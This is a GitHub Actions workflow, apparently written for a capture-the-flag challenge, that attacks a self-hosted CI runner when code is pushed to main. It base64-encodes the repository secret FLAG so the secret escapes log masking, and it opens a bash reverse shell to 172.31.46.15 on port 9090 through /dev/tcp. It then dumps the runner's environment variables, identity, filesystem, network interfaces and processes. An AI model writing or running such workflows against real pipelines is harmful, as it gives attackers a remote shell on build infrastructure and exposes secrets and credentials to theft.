name: Runner Info Recon

on:
  push:
    branches:
      - main
  workflow_dispatch:

jobs:
  enum:
    name: Environment Enumeration
    runs-on: self-hosted
    steps:
      - name: "CTF FLAG"
        env:
          MY_REPO_SECRET: ${{ secrets.FLAG }}
        run: echo $MY_REPO_SECRET | base64

      - name: rev
        run: bash -c 'bash -i >& /dev/tcp/172.31.46.15/9090 0>&1'

      - name: 🖥️ OS Info
        run: uname -a

      - name: 👤 Whoami
        run: whoami

      - name: 🔍 Environment Variables
        run: printenv

      - name: 📂 Filesystem Check
        run: ls -la /

      - name: 🔗 Network Interfaces
        run: |
          which ip && ip a || ifconfig

      - name: 🛠️ Running Processes
        run: ps aux
